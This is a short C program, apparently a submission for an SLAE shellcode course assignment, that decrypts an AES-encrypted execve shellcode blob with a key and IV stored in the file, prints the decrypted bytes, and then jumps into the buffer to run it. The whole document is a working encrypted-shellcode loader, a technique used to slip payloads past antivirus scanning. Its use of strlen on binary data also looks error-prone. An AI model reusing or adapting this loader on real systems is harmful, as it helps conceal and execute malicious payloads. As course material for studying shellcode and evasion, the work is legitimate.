/*
 *	SLAE Assignment 7: Decrypter
 *
 *	gcc a7-decrypter.c -o a7-decrypter -std=c99 -lmcrypt
 *
 *
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mcrypt.h>



// crypted execve shellcode
unsigned char code[] = \
"\xee\xd0\x97\xdb\x42\xd0\x5\xa4\xae\xe4\xfa\x7a\xbb\x5d\x9\x63\x5c\xce\x37\x61\x9d\x2a\x2b\xe\x25\x10\x87\xbe\xa3\x7a\x54\xb6";

unsigned char vector[] = \
"\x6c\x6f\x6c\xab\xd1\xa7\xc6\xa6\xd6\x9d\x5f\x8f\x56\x0e\x0c\xe3\x6a\x41\xad";



int main() 
{
	MCRYPT m;
	if ((m = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL)) == MCRYPT_FAILED) { printf("MCRYPT failed\n"); return 0; }
	
	int key_len = strlen(vector) - mcrypt_enc_get_iv_size(m);
	unsigned char* key = malloc(key_len);
	unsigned char* iv = malloc(mcrypt_enc_get_iv_size(m));

	memcpy(key, &vector, key_len);
	memcpy(iv, &vector[key_len], mcrypt_enc_get_iv_size(m));
	
	if (mcrypt_generic_init(m, key, strlen(key), iv) < 0) { printf("init failed\n"); return 0; }
	if (mdecrypt_generic(m, code, strlen(code))) { printf("decrypt failed\n"); return 0; }
	if (mcrypt_generic_deinit(m) < 0) { printf("deinit failed\n"); return 0; }
	mcrypt_module_close(m);

	printf ("[*] Vector: ");
	for (int i = 0; i < strlen(vector); i++) { 
		printf("%02x", vector[i] & 0xff); 
	}
	printf ("\n[*] Vector Length: %d\n", strlen(vector));
	printf ("[*] Key: ");
	for (int i = 0; i < strlen(key); i++) { 
		printf("%02x", key[i] & 0xff); 
	}
	printf ("\n[*] Key Length: %d\n", key_len);
	printf ("[*] IV: ");
	for (int i = 0; i < strlen(iv); i++) { 
		printf("%02x", iv[i] & 0xff); 
	}
	printf ("\n[*] IV Length: %d\n", strlen(iv));
	printf("\n[+] Shellcode: \n\n");
	for (int i = 0; i < strlen(code); i++) { 
		printf("\\x%x", code[i] & 0xff); 
	}
	printf("\n");

	int (*ret)() = (int(*)())code;
	ret();
	return 0;
}
